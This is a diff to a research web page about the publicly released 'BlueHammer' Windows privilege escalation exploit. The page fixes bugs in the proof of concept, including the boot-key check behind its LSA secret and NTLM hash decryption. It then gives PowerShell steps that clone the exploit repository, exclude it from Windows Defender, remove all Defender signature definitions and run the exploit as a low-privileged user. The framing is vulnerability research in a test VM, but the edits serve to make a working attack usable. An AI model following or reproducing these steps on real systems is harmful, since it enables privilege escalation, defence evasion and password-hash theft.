@@ -295,7 +295,7 @@ footer a:hover{color:var(--accent);}
 
 <p>On April 3, 2026, a researcher operating under the alias "Chaotic Eclipse" published a fully functional Windows local privilege escalation exploit to GitHub. The accompanying message to Microsoft's Security Response Center was blunt: <em>"I was not bluffing Microsoft, and I'm doing it again."</em></p>
 
-<p>The exploit, named <strong>BlueHammer</strong>, had no coordinated disclosure timeline, no CVE assignment, and no patch. Microsoft's only public response was a statement that it "supports coordinated vulnerability disclosure" — notable given how uncoordi nated the disclosure actually was. The researcher later explained the public drop followed MSRC allegedly dismissing the report after demanding a video demonstration that the researcher declined to provide.</p>
+<p>The exploit, named <strong>BlueHammer</strong>, had no coordinated disclosure timeline, no CVE assignment, and no patch. Microsoft's only public response was a statement that it "supports coordinated vulnerability disclosure" — notable given how uncoordinated the disclosure actually was. The researcher later explained the public drop followed MSRC allegedly dismissing the report after demanding a video demonstration that the researcher declined to provide.</p>
 
 <p>The README on the public repository made an important acknowledgement: <em>"There are few bugs in the PoC that could prevent it from working."</em> That was the starting point for this research — read the code, find the bugs, fix them, and understand the exploit chain in full.</p>
 
@@ -574,7 +574,7 @@ footer a:hover{color:var(--accent);}
     <span class="bug-file">FunnyApp.cpp ~line 1855</span>
   </div>
   <div class="bug-body">
-    <p>When the concatenated boot key hex string is shorter than 16 bytes (indicating a malformed or missing registry class name), the function is supposed to signal failure to the caller. The caller checks <code>if (!GetLSASecretKey(lsakey))</code> and aborts if it returns false.</p>
+    <p>When the concatenated boot key hex string is shorter than 32 characters — 16 bytes hex-encoded, 2 chars per byte — (indicating a malformed or missing registry class name), the function is supposed to signal failure to the caller. The caller checks <code>if (!GetLSASecretKey(lsakey))</code> and aborts if it returns false.</p>
     <p>The original code returned <code>1</code> on the error path. In C++, <code>1</code> is truthy — so <code>!GetLSASecretKey()</code> evaluated to <code>false</code>, the error was swallowed, execution continued with <code>lsakey</code> left as a zero-filled buffer, and all subsequent NTLM hash decryption produced garbage output silently. Effectively: boot key failure became an invisible bug that produced meaningless hash data.</p>
     <div class="diff diff-row">
       <div class="diff-before">
@@ -590,7 +590,7 @@ footer a:hover{color:var(--accent);}
       <div class="diff-after">
         <div class="diff-head"><i class="fa-solid fa-check" style="color:var(--green)"></i> After (fixed)</div>
         <div class="diff-col">
-          <pre><code><span class="kw">if</span> (strlen(data) < <span class="nu">16</span>) {
+          <pre><code><span class="kw">if</span> (strlen(data) < <span class="nu">32</span>) {
     printf(<span class="st">"Boot key mismatch."</span>);
     <span class="kw">return</span> <span class="kw">false</span>;  <span class="cm">// correctly signals
                    // failure to caller</span>
@@ -739,32 +739,38 @@ hint2 = <span class="kw">NULL</span>;  <span class="cm">// null the correct hand
 
 <div class="code-wrap">
   <div class="code-label"><span class="code-lang">PowerShell — build and run</span><button class="copy-btn">copy</button></div>
-  <pre><code><span class="cm"># 1. Add Defender exclusion for the build folder (required — Defender will flag the binary)</span>
-<span class="fn">Add-MpPreference</span> -ExclusionPath <span class="st">"C:\path\to\BlueHammer"</span>
+  <pre><code><span class="cm"># 1. Clone the repository</span>
+<span class="fn">git</span> clone https://github.com/Nightmare-Eclipse/BlueHammer
+<span class="fn">cd</span> BlueHammer
 
-<span class="cm"># 2. Apply all six bug fixes to FunnyApp.cpp and FunnyApp.vcxproj
-#    (as documented above)
+<span class="cm"># 2. Add Defender exclusion for the repo folder (required — Defender will flag the binary)</span>
+<span class="fn">Add-MpPreference</span> -ExclusionPath <span class="st">"$PWD"</span>
+<span class="fn">Add-MpPreference</span> -ExclusionPath <span class="st">"$PWD\x64\Release"</span>
 
-# 3. Open FunnyApp.vcxproj in Visual Studio 2022
+<span class="cm"># 3. Apply all six bug fixes to FunnyApp.cpp and FunnyApp.vcxproj
+#    (as documented above — including removing windefend_s.c from the vcxproj)
+
+# 4. Open FunnyApp.vcxproj in Visual Studio 2022
+#    Make sure the WDK offreg.lib path is configured under:
+#      Project → Properties → Linker → Input → Additional Dependencies
 #    Build → x64 Release
+#    Output: x64\Release\FunnyApp.exe
 
-# 4. Set up the test condition: WD signatures must have a pending update
-#    Option A: disconnect VM from internet for 24+ hours
-#    Option B: roll back signatures manually</span>
+# 5. Set up the test condition: WD signatures must be out-of-date
+#    The exploit's CheckForWDUpdates loop will halt immediately if signatures are current.
+#
+#    Option A: Disconnect the test VM from the internet for 24+ hours and wait for
+#              signatures to go stale (most reliable).
+#
+#    Option B: Remove current definitions so WD registers a pending update immediately.</span>
 <span class="kw">$</span>wdPath = <span class="st">"$env:ProgramFiles\Windows Defender"</span>
-<span class="pp">&</span> <span class="st">"$wdPath\MpCmdRun.exe"</span> -SignatureUpdate -MMPC
+<span class="pp">&</span> <span class="st">"$wdPath\MpCmdRun.exe"</span> -RemoveDefinitions -All
 
-<span class="cm"># If MpCmdRun returns 0x80070652 (ERROR_INSTALL_ALREADY_RUNNING):
-# Stop WU services, clear cache, retry</span>
-<span class="fn">Stop-Service</span> -Name wuauserv, cryptsvc, bits, msiserver -Force -ErrorAction SilentlyContinue
-<span class="fn">Remove-Item</span> <span class="st">"$env:SystemRoot\SoftwareDistribution"</span> -Recurse -Force -ErrorAction SilentlyContinue
-<span class="fn">Remove-Item</span> <span class="st">"$env:SystemRoot\System32\catroot2"</span> -Recurse -Force -ErrorAction SilentlyContinue
-<span class="fn">Start-Service</span> -Name cryptsvc, bits, wuauserv
-<span class="fn">Start-Sleep</span> -Seconds <span class="nu">5</span>
-<span class="pp">&</span> <span class="st">"$wdPath\MpCmdRun.exe"</span> -SignatureUpdate -MMPC
+<span class="cm"># Verify WD now reports out-of-date signatures (AntivirusSignatureAge should be > 0)</span>
+<span class="fn">Get-MpComputerStatus</span> | <span class="fn">Select-Object</span> AntivirusSignatureLastUpdated, AntivirusSignatureAge
 
-<span class="cm"># 5. Run the fixed exploit as a low-privileged user</span>
-<span class="pp">.</span>\FunnyApp.exe</code></pre>
+<span class="cm"># 6. Run the fixed exploit as a low-privileged user</span>
+<span class="pp">.</span>\x64\Release\FunnyApp.exe</code></pre>
 </div>
 
 <div class="callout c-info">
